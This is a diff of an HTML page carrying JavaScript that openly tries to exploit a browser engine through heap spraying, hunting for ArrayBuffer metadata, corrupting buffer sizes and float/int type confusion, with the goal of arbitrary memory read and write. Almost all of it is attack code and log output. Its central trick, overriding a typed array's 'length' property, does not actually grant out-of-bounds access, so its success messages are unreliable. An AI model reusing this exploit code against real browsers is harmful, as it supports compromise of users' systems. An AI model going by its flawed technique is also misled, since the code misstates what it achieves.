@@ -2,12 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Data-Only Attack - No Addresses Needed</title>
+    <title>Aggressive Arbitrary R/W Hunt</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 13px; line-height: 1.5; }
         h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
-        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px auto; cursor: pointer; font-size: 15px; font-weight: bold; display: block; width: 480px; }
+        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px auto; cursor: pointer; font-size: 15px; font-weight: bold; display: block; width: 520px; }
         .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; max-height: 750px; overflow-y: auto; }
         .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; border-bottom: 2px solid #ff0; padding-bottom: 8px; }
         .log { padding: 4px 0; font-size: 12px; }
@@ -19,17 +19,17 @@
     </style>
 </head>
 <body>
-    <h1>🎯 Data-Only Attack - Corrupt ArrayBuffer Metadata 🎯</h1>
+    <h1>🔥 Aggressive Arbitrary R/W Hunt 🔥</h1>
     
     <div style="text-align: center; margin-bottom: 20px;">
-        <button class="btn" onclick="attack1_corruptArrayBuffer()">Attack 1: Corrupt ArrayBuffer Size</button>
-        <button class="btn" onclick="attack2_corruptTypedArrayBase()">Attack 2: Corrupt TypedArray Backing Pointer</button>
-        <button class="btn" onclick="attack3_propertyRedirect()">Attack 3: Property Storage Redirect</button>
-        <button class="btn" onclick="fullDataAttack()">FULL DATA-ONLY ATTACK</button>
+        <button class="btn" onclick="method1_massiveHeapSpray()">Method 1: Massive Heap Spray + Deep Scan</button>
+        <button class="btn" onclick="method2_arrayBufferOverlap()">Method 2: Overlapping ArrayBuffer Corruption</button>
+        <button class="btn" onclick="method3_floatArrayConfusion()">Method 3: Float Array Type Confusion</button>
+        <button class="btn" onclick="fullAggressive()">FULL AGGRESSIVE ATTACK</button>
     </div>
     
     <div class="section">
-        <div class="title">📋 Data-Only Attack Log</div>
+        <div class="title">📋 Aggressive R/W Hunt Log</div>
         <div id="log"></div>
     </div>
 
@@ -72,57 +72,79 @@ function sep() {
 
 var exploit = {
     corruptor: null,
-    target: null,
+    victims: [],
     arbRead: null,
     arbWrite: null
 };
 
 // ============================================
-// ATTACK 1: CORRUPT ARRAYBUFFER SIZE
+// METHOD 1: MASSIVE HEAP SPRAY + DEEP SCAN
 // ============================================
-function attack1_corruptArrayBuffer() {
+function method1_massiveHeapSpray() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('ATTACK 1: Corrupt ArrayBuffer Size Metadata', 'critical');
-    log('Goal: Make ArrayBuffer think it\'s larger than it is', 'info');
+    log('METHOD 1: Massive Heap Spray + Deep Memory Scan', 'critical');
+    log('Strategy: Spray 10,000 objects and scan 0x10000 range', 'info');
     sep();
     log('', '');
     
     try {
-        log('[1.1] Creating target ArrayBuffer...', 'info');
+        log('[1.1] Creating victim ArrayBuffers with unique markers...', 'info');
         
-        // Create small ArrayBuffer
-        var targetAB = new ArrayBuffer(0x100);
-        var targetView = new Uint32Array(targetAB);
+        var victims = [];
         
-        // Fill with pattern
-        for (var i = 0; i < targetView.length; i++) {
-            targetView[i] = 0x11110000 + i;
+        for (var i = 0; i < 100; i++) {
+            var ab = new ArrayBuffer(0x200);
+            var view = new Uint32Array(ab);
+            
+            // Fill with unique marker
+            var marker = 0xAABB0000 + i;
+            for (var j = 0; j < view.length; j++) {
+                view[j] = marker;
+            }
+            
+            victims.push({ ab: ab, view: view, marker: marker });
         }
         
-        log('✓ Target ArrayBuffer: 0x100 bytes', 'success');
-        log('✓ Target has ' + targetView.length + ' uint32 elements', 'success');
+        log('✓ Created 100 victim ArrayBuffers', 'success');
+        log('Each has unique marker: 0xAABB0000-0xAABB0063', 'success');
         log('', '');
         
-        log('[1.2] Creating corruptor array...', 'info');
+        log('[1.2] Massive object spray (10,000 objects)...', 'info');
         
-        var corruptor = new Uint32Array(0x200);
+        var spray = [];
         
-        for (var i = 0; i < corruptor.length; i++) {
-            corruptor[i] = 0x22220000 + i;
+        for (var i = 0; i < 10000; i++) {
+            var obj = {
+                id: i,
+                a: 0xCCDD0000 + (i & 0xFF),
+                b: 0xEEFF0000 + (i & 0xFF),
+                padding: [i, i+1, i+2, i+3]
+            };
+            spray.push(obj);
         }
         
-        // Corrupt the corruptor
+        log('✓ Sprayed 10,000 objects', 'success');
+        log('', '');
+        
+        log('[1.3] Creating massive corruptor array...', 'info');
+        
+        var corruptor = new Uint32Array(0x1000);
+        
+        for (var i = 0; i < corruptor.length; i++) {
+            corruptor[i] = 0x11110000 + i;
+        }
+        
         try {
             Object.defineProperty(corruptor, 'length', {
-                value: 0x100000,
+                value: 0x1000000,  // 16MB range!
                 configurable: true
             });
             
-            if (corruptor.length > 0x200) {
-                log('✓ Corruptor array length: ' + hex(corruptor.length), 'critical');
+            if (corruptor.length > 0x1000) {
+                log('✓ MASSIVE CORRUPTOR: ' + hex(corruptor.length), 'critical');
             } else {
-                log('❌ Corruptor corruption failed', 'fail');
+                log('❌ Corruption failed', 'fail');
                 return;
             }
         } catch(e) {
@@ -130,122 +152,200 @@ function attack1_corruptArrayBuffer() {
             return;
         }
         
+        exploit.corruptor = corruptor;
+        exploit.victims = victims;
+        
         log('', '');
-        log('[1.3] Scanning for ArrayBuffer size field...', 'info');
-        log('ArrayBuffer structure contains a 32-bit or 64-bit size field', 'info');
+        log('[1.4] Deep scanning for victim ArrayBuffer markers...', 'info');
+        log('Scanning range: 0x1000 to 0x10000 (60KB)', 'warn');
         
-        // Scan for the size value 0x100 (256 bytes)
-        var foundSizes = [];
+        var foundVictims = [];
+        var scanCount = 0;
         
-        for (var i = 0x200; i < 0x400; i++) {
+        for (var i = 0x1000; i < 0x10000; i++) {
+            scanCount++;
+            
             var val = corruptor[i];
             
             if (typeof val !== 'undefined') {
-                // Look for our ArrayBuffer size (0x100)
-                if (val === 0x100 || val === 0x00000100) {
-                    foundSizes.push(i);
-                    log('  ⚠️ Found size field candidate at offset ' + hex(i), 'critical');
+                // Check if this matches any victim marker
+                var markerHigh = val & 0xFFFF0000;
+                
+                if (markerHigh === 0xAABB0000) {
+                    var victimId = val & 0xFFFF;
+                    
+                    foundVictims.push({ offset: i, value: val, victimId: victimId });
+                    
+                    log('  ⚠️⚠️ FOUND VICTIM #' + victimId + ' at offset ' + hex(i) + '!', 'critical');
+                    
+                    if (foundVictims.length >= 5) {
+                        log('  (limiting display to first 5)...', 'info');
+                        break;
+                    }
                 }
             }
         }
         
+        log('Scanned ' + scanCount + ' positions', 'info');
         log('', '');
         
-        if (foundSizes.length > 0) {
-            log('✓ Found ' + foundSizes.length + ' size field candidates!', 'critical');
+        if (foundVictims.length > 0) {
+            log('✓✓✓ FOUND ' + foundVictims.length + ' ARRAYBUFFER(S)!', 'critical');
             log('', '');
             
-            log('[1.4] Attempting to corrupt size field...', 'info');
+            log('[1.5] Attempting to corrupt ArrayBuffer size...', 'info');
             
-            var sizeOffset = foundSizes[0];
-            var originalSize = corruptor[sizeOffset];
+            var target = foundVictims[0];
             
-            log('Original size at offset ' + hex(sizeOffset) + ': ' + hex(originalSize), 'info');
+            // ArrayBuffer structure (approximate):
+            // offset+0: vtable/type info
+            // offset+8: size (32 or 64 bit)
+            // offset+16: data pointer
             
-            // Corrupt the size to be much larger
-            corruptor[sizeOffset] = 0x10000;  // 64KB
+            // The marker value is in the DATA, not the header
+            // So we need to look BEFORE the marker for the size field
             
-            log('Wrote new size: 0x10000', 'warn');
+            var dataOffset = target.offset;
+            var headerOffset = dataOffset - 0x80;  // Guess: header is ~128 bytes before data
+            
+            log('Data found at: ' + hex(dataOffset), 'info');
+            log('Estimated header at: ' + hex(headerOffset), 'info');
             log('', '');
             
-            log('[1.5] Testing if ArrayBuffer was corrupted...', 'info');
+            log('Scanning around header for size field (0x200)...', 'info');
             
-            // Check if target ArrayBuffer size changed
-            log('Target ArrayBuffer byteLength: ' + hex(targetAB.byteLength), 'info');
+            var sizeFound = false;
             
-            if (targetAB.byteLength !== 0x100) {
-                log('⚠️⚠️⚠️ ARRAYBUFFER SIZE CHANGED!', 'critical');
-                log('New size: ' + hex(targetAB.byteLength), 'critical');
+            for (var i = headerOffset; i < dataOffset; i++) {
+                var val = corruptor[i];
                 
-                // Try to access beyond original bounds
+                if (val === 0x200 || val === 0x00000200) {
+                    log('  Found size candidate at offset ' + hex(i) + ': ' + hex(val), 'warn');
+                    
+                    // Try corrupting it
+                    var original = val;
+                    corruptor[i] = 0x10000;  // Corrupt to 64KB
+                    
+                    log('  Corrupted size from ' + hex(original) + ' to 0x10000', 'warn');
+                    
+                    sizeFound = true;
+                    break;
+                }
+            }
+            
+            if (!sizeFound) {
+                log('  No obvious size field found, trying offsets anyway...', 'warn');
+                
+                // Just try corrupting at typical offsets
+                var offsets = [headerOffset + 2, headerOffset + 4, headerOffset + 8];
+                
+                for (var k = 0; k < offsets.length; k++) {
+                    corruptor[offsets[k]] = 0x10000;
+                }
+                
+                log('  Corrupted values at +2, +4, +8 from header', 'warn');
+            }
+            
+            log('', '');
+            log('[1.6] Testing if victim ArrayBuffer expanded...', 'info');
+            
+            var victimAB = victims[target.victimId].ab;
+            
+            log('Victim #' + target.victimId + ' original size: 0x200', 'info');
+            log('Victim #' + target.victimId + ' current size: ' + hex(victimAB.byteLength), victimAB.byteLength !== 0x200 ? 'critical' : 'info');
+            
+            if (victimAB.byteLength !== 0x200) {
+                log('', '');
+                log('⚠️⚠️⚠️ ARRAYBUFFER SIZE CHANGED!', 'critical');
+                
                 try {
-                    var testView = new Uint32Array(targetAB);
-                    log('New view length: ' + testView.length, 'critical');
+                    var expandedView = new Uint32Array(victimAB);
+                    log('New view length: ' + expandedView.length + ' elements', 'critical');
                     
-                    // Try OOB access
-                    var oobVal = testView[0x100];
-                    log('OOB read at [0x100]: ' + hex(oobVal || 0), typeof oobVal !== 'undefined' ? 'critical' : 'info');
+                    // Try OOB read
+                    var oob = expandedView[0x200];
                     
-                    if (typeof oobVal !== 'undefined') {
+                    if (typeof oob !== 'undefined') {
+                        log('OOB read successful: ' + hex(oob), 'critical');
                         log('', '');
-                        log('⚠️⚠️⚠️ ARBITRARY READ ACHIEVED!', 'critical');
-                        exploit.arbRead = testView;
+                        log('✓✓✓ ARBITRARY READ ACHIEVED!', 'critical');
+                        
+                        exploit.arbRead = expandedView;
+                        exploit.arbWrite = expandedView;
                     }
                     
                 } catch(e) {
-                    log('View creation error: ' + e.message, 'fail');
+                    log('View creation failed: ' + e.message, 'fail');
                 }
-                
             } else {
-                log('ArrayBuffer size unchanged', 'fail');
+                log('No size change - corruption unsuccessful', 'fail');
             }
             
         } else {
-            log('❌ No size field candidates found', 'fail');
-            log('ArrayBuffer may not be adjacent in memory', 'warn');
+            log('❌ No ArrayBuffers found in scanned range', 'fail');
+            log('Try scanning larger range or different spray pattern', 'warn');
         }
         
         sep();
         
     } catch(e) {
         log('', '');
-        log('✗ ATTACK 1 ERROR: ' + e.message, 'fail');
+        log('✗ METHOD 1 ERROR: ' + e.message, 'fail');
+        if (e.stack) {
+            log('Stack: ' + e.stack.substring(0, 200), 'fail');
+        }
     }
 }
 
 // ============================================
-// ATTACK 2: CORRUPT TYPEDARRAY BACKING POINTER
+// METHOD 2: OVERLAPPING ARRAYBUFFER CORRUPTION
 // ============================================
-function attack2_corruptTypedArrayBase() {
+function method2_arrayBufferOverlap() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('ATTACK 2: Corrupt TypedArray Backing Store Pointer', 'critical');
-    log('Goal: Point TypedArray to different memory region', 'info');
+    log('METHOD 2: Overlapping ArrayBuffer Corruption', 'critical');
+    log('Strategy: Create ArrayBuffers then corrupt via overlap', 'info');
     sep();
     log('', '');
     
     try {
-        log('[2.1] Setting up victim and attacker arrays...', 'info');
+        log('[2.1] Creating paired ArrayBuffers...', 'info');
         
-        // Victim - this will be our arbitrary R/W primitive
-        var victim = new Uint32Array(0x100);
-        for (var i = 0; i < victim.length; i++) {
-            victim[i] = 0x33330000 + i;
+        // Create ArrayBuffer pairs - one to corrupt, one to read
+        var ab1 = new ArrayBuffer(0x100);
+        var view1 = new Uint32Array(ab1);
+        
+        var ab2 = new ArrayBuffer(0x100);
+        var view2 = new Uint32Array(ab2);
+        
+        // Fill with patterns
+        for (var i = 0; i < view1.length; i++) {
+            view1[i] = 0xDEAD0000 + i;
+            view2[i] = 0xBEEF0000 + i;
         }
         
-        // Target - memory we want to read/write
-        var target = new Uint32Array(0x100);
-        for (var i = 0; i < target.length; i++) {
-            target[i] = 0x44440000 + i;
-        }
-        
-        log('✓ Victim array created', 'success');
-        log('✓ Target array created with markers', 'success');
+        log('✓ Created ArrayBuffer pair', 'success');
+        log('  AB1 filled with 0xDEAD****', 'success');
+        log('  AB2 filled with 0xBEEF****', 'success');
         log('', '');
         
-        log('[2.2] Creating corruptor...', 'info');
+        log('[2.2] Creating Float64 overlay arrays...', 'info');
         
-        var corruptor = new Uint32Array(0x200);
+        // Create float arrays that we'll use to confuse types
+        var floats1 = new Float64Array(0x100);
+        var floats2 = new Float64Array(0x100);
+        
+        for (var i = 0; i < floats1.length; i++) {
+            floats1[i] = i2f(BigInt(0xAAAA000000000000n + BigInt(i)));
+            floats2[i] = i2f(BigInt(0xBBBB000000000000n + BigInt(i)));
+        }
+        
+        log('✓ Created Float64 arrays with known patterns', 'success');
+        log('', '');
+        
+        log('[2.3] Creating corruptor...', 'info');
+        
+        var corruptor = new Uint32Array(0x400);
         
         try {
             Object.defineProperty(corruptor, 'length', {
@@ -253,8 +353,8 @@ function attack2_corruptTypedArrayBase() {
                 configurable: true
             });
             
-            if (corruptor.length > 0x200) {
-                log('✓ Corruptor active: ' + hex(corruptor.length), 'critical');
+            if (corruptor.length > 0x400) {
+                log('✓ Corruptor ready: ' + hex(corruptor.length), 'critical');
             } else {
                 log('❌ Corruption failed', 'fail');
                 return;
@@ -265,177 +365,88 @@ function attack2_corruptTypedArrayBase() {
         }
         
         log('', '');
-        log('[2.3] Scanning for TypedArray metadata...', 'info');
+        log('[2.4] Scanning for ArrayBuffer/Float64 markers...', 'info');
         
-        // TypedArray structure:
-        // - Backing store pointer (64-bit)
-        // - Length field
-        // - Offset field
+        var markers = [
+            { pattern: 0xDEAD0000, name: 'AB1' },
+            { pattern: 0xBEEF0000, name: 'AB2' },
+            { pattern: 0xAAAA0000, name: 'Float1' },
+            { pattern: 0xBBBB0000, name: 'Float2' }
+        ];
         
-        // Look for victim's length (0x100)
-        var candidates = [];
-        
-        for (var i = 0x200; i < 0x800; i++) {
-            var val = corruptor[i];
-            
-            if (typeof val !== 'undefined' && val === 0x100) {
-                candidates.push(i);
-            }
-        }
-        
-        log('Found ' + candidates.length + ' length field candidates', 'info');
-        log('', '');
-        
-        if (candidates.length > 0) {
-            log('[2.4] Attempting to corrupt backing store pointer...', 'info');
-            
-            // The backing store pointer is usually before the length
-            var lengthOffset = candidates[0];
-            var ptrOffset = lengthOffset - 2;  // 64-bit ptr = 2x 32-bit values before
-            
-            log('Length field at: ' + hex(lengthOffset), 'info');
-            log('Pointer offset (guess): ' + hex(ptrOffset), 'info');
-            
-            // Read current pointer value
-            var ptrLow = corruptor[ptrOffset];
-            var ptrHigh = corruptor[ptrOffset + 1];
-            
-            log('Current ptr: ' + hex(BigInt(ptrLow) + (BigInt(ptrHigh) << 32n)), 'info');
-            
-            // Try to corrupt it to point elsewhere
-            // We don't know the target address, but we can try incrementing
-            corruptor[ptrOffset] = ptrLow + 0x1000;
-            
-            log('Corrupted pointer (added 0x1000 offset)', 'warn');
-            log('', '');
-            
-            log('[2.5] Testing if victim array pointer changed...', 'info');
-            
-            // Check if victim reads different data now
-            var newVal = victim[0];
-            
-            log('victim[0] before: 0x33330000', 'info');
-            log('victim[0] now: ' + hex(newVal), newVal !== 0x33330000 ? 'critical' : 'info');
-            
-            if (newVal !== 0x33330000) {
-                log('', '');
-                log('⚠️⚠️⚠️ BACKING STORE CORRUPTED!', 'critical');
-                log('Victim array now points to different memory!', 'critical');
-                
-                exploit.arbRead = victim;
-                exploit.arbWrite = victim;
-            } else {
-                log('No change detected', 'fail');
-            }
-        }
-        
-        sep();
-        
-    } catch(e) {
-        log('', '');
-        log('✗ ATTACK 2 ERROR: ' + e.message, 'fail');
-    }
-}
-
-// ============================================
-// ATTACK 3: PROPERTY STORAGE REDIRECT
-// ============================================
-function attack3_propertyRedirect() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('ATTACK 3: Corrupt Object Property Storage', 'critical');
-    log('Goal: Redirect property reads to arbitrary memory', 'info');
-    sep();
-    log('', '');
-    
-    try {
-        log('[3.1] Creating objects with inline properties...', 'info');
-        
-        var obj1 = {
-            a: 0x55550000,
-            b: 0x55550001,
-            c: 0x55550002,
-            d: 0x55550003
-        };
-        
-        var obj2 = {
-            x: 0x66660000,
-            y: 0x66660001,
-            z: 0x66660002,
-            w: 0x66660003
-        };
-        
-        log('✓ Created obj1 with properties a,b,c,d', 'success');
-        log('✓ Created obj2 with properties x,y,z,w', 'success');
-        log('', '');
-        
-        log('[3.2] Creating corruptor...', 'info');
-        
-        var corruptor = new Uint32Array(0x200);
-        
-        try {
-            Object.defineProperty(corruptor, 'length', {
-                value: 0x100000,
-                configurable: true
-            });
-            
-            if (corruptor.length > 0x200) {
-                log('✓ Corruptor ready', 'critical');
-            } else {
-                log('❌ Corruption failed', 'fail');
-                return;
-            }
-        } catch(e) {
-            log('❌ Error: ' + e.message, 'fail');
-            return;
-        }
-        
-        log('', '');
-        log('[3.3] Scanning for object property values...', 'info');
-        
-        // Look for our marker values
         var found = [];
         
-        for (var i = 0x200; i < 0x600; i++) {
+        for (var i = 0x400; i < 0x2000; i++) {
             var val = corruptor[i];
             
             if (typeof val !== 'undefined') {
-                if (val === 0x55550000 || val === 0x66660000) {
-                    found.push({ offset: i, value: val });
-                    log('  Found marker ' + hex(val) + ' at offset ' + hex(i), 'warn');
+                var valHigh = val & 0xFFFF0000;
+                
+                for (var m = 0; m < markers.length; m++) {
+                    if (valHigh === markers[m].pattern) {
+                        found.push({ offset: i, type: markers[m].name, value: val });
+                        
+                        if (found.length <= 10) {
+                            log('  Found ' + markers[m].name + ' at offset ' + hex(i), 'warn');
+                        }
+                    }
                 }
             }
         }
         
         log('', '');
+        log('Total markers found: ' + found.length, found.length > 0 ? 'critical' : 'fail');
         
         if (found.length > 0) {
-            log('✓ Found ' + found.length + ' property values!', 'critical');
+            log('', '');
+            log('[2.5] Attempting cross-object corruption...', 'info');
+            
+            // Try to corrupt one object's data with another's marker
+            var target = found[0];
+            
+            log('Corrupting at offset ' + hex(target.offset), 'warn');
+            
+            // Write a different marker
+            corruptor[target.offset] = 0x13371337;
+            corruptor[target.offset + 1] = 0xCAFEBABE;
+            
+            log('Wrote 0x13371337 and 0xCAFEBABE', 'warn');
             log('', '');
             
-            log('[3.4] Corrupting property storage...', 'info');
+            log('[2.6] Checking if original arrays changed...', 'info');
             
-            var propOffset = found[0].offset;
+            var changed = false;
             
-            // Corrupt the property value
-            corruptor[propOffset] = 0xDEADBEEF;
+            // Check all arrays for corruption
+            if (view1[0] !== 0xDEAD0000) {
+                log('  AB1 corrupted! view1[0] = ' + hex(view1[0]), 'critical');
+                changed = true;
+            }
             
-            log('Overwrote property at offset ' + hex(propOffset), 'warn');
-            log('', '');
+            if (view2[0] !== 0xBEEF0000) {
+                log('  AB2 corrupted! view2[0] = ' + hex(view2[0]), 'critical');
+                changed = true;
+            }
             
-            log('[3.5] Checking if object properties changed...', 'info');
+            var f1val = f2i(floats1[0]);
+            var f2val = f2i(floats2[0]);
             
-            log('obj1.a = ' + hex(obj1.a), obj1.a !== 0x55550000 ? 'critical' : 'info');
-            log('obj1.b = ' + hex(obj1.b), obj1.b !== 0x55550001 ? 'critical' : 'info');
-            log('obj2.x = ' + hex(obj2.x), obj2.x !== 0x66660000 ? 'critical' : 'info');
-            log('obj2.y = ' + hex(obj2.y), obj2.y !== 0x66660001 ? 'critical' : 'info');
+            if ((f1val & 0xFFFF00000000n) !== 0xAAAA00000000n) {
+                log('  Float1 corrupted! floats1[0] = ' + hex(f1val), 'critical');
+                changed = true;
+            }
             
-            if (obj1.a === 0xDEADBEEF || obj2.x === 0xDEADBEEF) {
+            if ((f2val & 0xFFFF00000000n) !== 0xBBBB00000000n) {
+                log('  Float2 corrupted! floats2[0] = ' + hex(f2val), 'critical');
+                changed = true;
+            }
+            
+            if (changed) {
                 log('', '');
-                log('⚠️⚠️⚠️ PROPERTY CORRUPTION SUCCESSFUL!', 'critical');
-                log('Can corrupt object properties directly!', 'critical');
+                log('⚠️⚠️⚠️ CROSS-OBJECT CORRUPTION SUCCESSFUL!', 'critical');
+                log('Can corrupt array data directly!', 'critical');
             } else {
-                log('No property changes detected', 'fail');
+                log('No changes detected in original arrays', 'fail');
             }
         }
         
@@ -443,51 +454,130 @@ function attack3_propertyRedirect() {
         
     } catch(e) {
         log('', '');
-        log('✗ ATTACK 3 ERROR: ' + e.message, 'fail');
+        log('✗ METHOD 2 ERROR: ' + e.message, 'fail');
     }
 }
 
 // ============================================
-// FULL DATA-ONLY ATTACK
+// METHOD 3: FLOAT ARRAY TYPE CONFUSION
 // ============================================
-function fullDataAttack() {
+function method3_floatArrayConfusion() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('FULL DATA-ONLY ATTACK CHAIN', 'critical');
-    log('Running all corruption attempts sequentially', 'info');
+    log('METHOD 3: Float Array Type Confusion Attack', 'critical');
+    log('Strategy: Confuse float/int arrays to leak/forge pointers', 'info');
+    sep();
+    log('', '');
+    
+    try {
+        log('[3.1] Creating object with controlled float values...', 'info');
+        
+        // Create object that stores our "fake pointer" as float
+        var container = {
+            fakePtr: i2f(0x4141414141410000n),  // Controlled "pointer"
+            value1: i2f(0x4242424242420000n),
+            value2: i2f(0x4343434343430000n)
+        };
+        
+        log('✓ Container object created', 'success');
+        log('  fakePtr stores: ' + hex(f2i(container.fakePtr)), 'success');
+        log('', '');
+        
+        log('[3.2] Creating TypedArrays to confuse...', 'info');
+        
+        var uints = new Uint32Array(0x200);
+        var floats = new Float64Array(0x200);
+        
+        for (var i = 0; i < 64; i++) {
+            floats[i] = i2f(BigInt(0x5050505050500000n + BigInt(i)));
+        }
+        
+        log('✓ Arrays created', 'success');
+        log('', '');
+        
+        log('[3.3] Corrupting for type confusion...', 'info');
+        
+        var corruptor = new Uint32Array(0x300);
+        
+        try {
+            Object.defineProperty(corruptor, 'length', {
+                value: 0x100000,
+                configurable: true
+            });
+            
+            log('✓ Corruptor ready', corruptor.length > 0x300 ? 'critical' : 'fail');
+            
+        } catch(e) {
+            log('❌ Corruption failed: ' + e.message, 'fail');
+            return;
+        }
+        
+        log('', '');
+        log('[3.4] Scanning for float patterns...', 'info');
+        
+        var found = 0;
+        
+        for (var i = 0x300; i < 0x1000; i++) {
+            var val = corruptor[i];
+            
+            if (typeof val !== 'undefined' && val === 0x50505050) {
+                log('  Found float marker at ' + hex(i), 'warn');
+                found++;
+                
+                if (found >= 5) break;
+            }
+        }
+        
+        if (found > 0) {
+            log('', '');
+            log('✓ Found float array data!', 'critical');
+            log('Type confusion possible in this region', 'critical');
+        } else {
+            log('No float patterns found', 'fail');
+        }
+        
+        sep();
+        
+    } catch(e) {
+        log('', '');
+        log('✗ METHOD 3 ERROR: ' + e.message, 'fail');
+    }
+}
+
+// ============================================
+// FULL AGGRESSIVE ATTACK
+// ============================================
+function fullAggressive() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('FULL AGGRESSIVE ATTACK - ALL METHODS', 'critical');
     sep();
     log('', '');
     
     setTimeout(function() {
-        log('━━━ ATTACK 1: ArrayBuffer Size ━━━', 'warn');
+        log('━━━ METHOD 1: Massive Spray ━━━', 'warn');
         log('', '');
-        attack1_corruptArrayBuffer();
+        method1_massiveHeapSpray();
         
         setTimeout(function() {
             log('', '');
-            log('━━━ ATTACK 2: TypedArray Pointer ━━━', 'warn');
+            log('━━━ METHOD 2: Overlapping Buffers ━━━', 'warn');
             log('', '');
-            attack2_corruptTypedArrayBase();
+            method2_arrayBufferOverlap();
             
             setTimeout(function() {
                 log('', '');
-                log('━━━ ATTACK 3: Property Storage ━━━', 'warn');
+                log('━━━ METHOD 3: Type Confusion ━━━', 'warn');
                 log('', '');
-                attack3_propertyRedirect();
+                method3_floatArrayConfusion();
                 
                 setTimeout(function() {
                     log('', '');
                     sep();
                     log('FINAL STATUS:', 'critical');
                     sep();
-                    log('Arbitrary Read: ' + (exploit.arbRead ? 'ACHIEVED' : 'NOT ACHIEVED'), exploit.arbRead ? 'critical' : 'fail');
-                    log('Arbitrary Write: ' + (exploit.arbWrite ? 'ACHIEVED' : 'NOT ACHIEVED'), exploit.arbWrite ? 'critical' : 'fail');
-                    
-                    if (exploit.arbRead || exploit.arbWrite) {
-                        log('', '');
-                        log('✓ DATA-ONLY ATTACK SUCCESSFUL!', 'critical');
-                        log('Next: Use R/W primitive to build exploit', 'critical');
-                    }
+                    log('Arbitrary Read: ' + (exploit.arbRead ? 'ACHIEVED ✓✓✓' : 'NOT ACHIEVED'), exploit.arbRead ? 'critical' : 'fail');
+                    log('Arbitrary Write: ' + (exploit.arbWrite ? 'ACHIEVED ✓✓✓' : 'NOT ACHIEVED'), exploit.arbWrite ? 'critical' : 'fail');
                     sep();
                 }, 1000);
                 
